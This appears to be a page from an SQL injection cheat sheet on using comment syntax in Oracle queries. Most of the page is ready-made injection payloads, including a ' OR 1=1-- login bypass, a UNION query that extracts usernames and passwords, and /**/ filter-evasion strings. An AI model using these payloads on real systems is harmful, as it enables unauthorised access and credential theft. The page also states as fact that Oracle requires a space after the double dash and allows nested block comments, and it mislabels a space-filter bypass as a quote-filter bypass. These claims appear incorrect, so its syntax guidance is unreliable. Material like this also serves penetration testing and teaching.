---
title: Comment Out Query
description: How to comment out queries in Oracle Database
category: Basics
order: 2
tags: ["basics", "syntax", "comments"]
lastUpdated: 2023-03-15
---

## Comment Out Query

When performing SQL injection attacks against Oracle databases, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. Oracle provides specific syntaxes for commenting.

### Oracle Comment Syntax

Oracle supports two primary methods for commenting out query parts:

| Comment Type | Syntax | Description |
|--------------|--------|-------------|
| Single-line comment | `--` | Comments out everything to the end of the line |
| Block comment | `/* ... */` | Can span multiple lines |

### Single-Line Comments

The double dash `--` is the most common way to comment out the rest of a query in Oracle:

```sql
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'something'
```

**Important**: In Oracle, the double dash must be followed by a space or line terminator to be recognized as a comment.

```sql
-- Correct:
SELECT * FROM users WHERE username = 'admin'-- AND password = 'test'

-- Also correct:
SELECT * FROM users WHERE username = 'admin'--  AND password = 'test'

-- Incorrect (no space after --):
SELECT * FROM users WHERE username = 'admin'--AND password = 'test'
```

### Block Comments

Block comments start with `/*` and end with `*/`:

```sql
SELECT * FROM users WHERE username = 'admin'/* AND password = 'something' */
```

Block comments are useful when you need to comment out code in the middle of a statement:

```sql
SELECT user_id, username /* , password */ FROM users
```

### Examples in SQL Injection Context

#### Login Bypass

```sql
-- Original query:
SELECT * FROM users WHERE username = 'input1' AND password = 'input2'

-- Injection with comment:
' OR 1=1--  

-- Resulting query:
SELECT * FROM users WHERE username = '' OR 1=1--  ' AND password = 'input2'
```

#### UNION Attack

```sql
-- Original query:
SELECT article_id, title, content FROM articles WHERE article_id = 'input'

-- Injection with comment:
-1 UNION SELECT username, password, null FROM users--  

-- Resulting query:
SELECT article_id, title, content FROM articles WHERE article_id = -1 UNION SELECT username, password, null FROM users--  
```

### Oracle-Specific Notes

Unlike some other database systems, Oracle:

1. Does not support the hash (`#`) comment syntax
2. Requires a space after the double dash (`--`)
3. Does not support the MySQL-style `-- -` comment syntax
4. Allows nested block comments `/* outer /* inner */ outer */`

### Practical Applications

#### Terminating Complex Queries

For complex queries with multiple conditions, commenting is essential:

```sql
-- Original query with multiple WHERE conditions
SELECT * FROM products WHERE category_id = 'input' AND active = 1 AND price > 0

-- Injection with comment to bypass additional conditions
' OR 1=1--  

-- Resulting query
SELECT * FROM products WHERE category_id = '' OR 1=1--  ' AND active = 1 AND price > 0
```

#### Bypassing Quote Filters

If single quotes are filtered, you might be able to use comment handling:

```sql
-- Using comments to build the payload without quotes
SELECT/**/username/**/FROM/**/users/**/WHERE/**/user_id=1--  
```

#### Multi-Line Statement Handling

Oracle's PL/SQL blocks can be complicated, and sometimes you need block comments:

```sql
' OR 1=1 /*
complex
multi-line
logic
*/--  
```

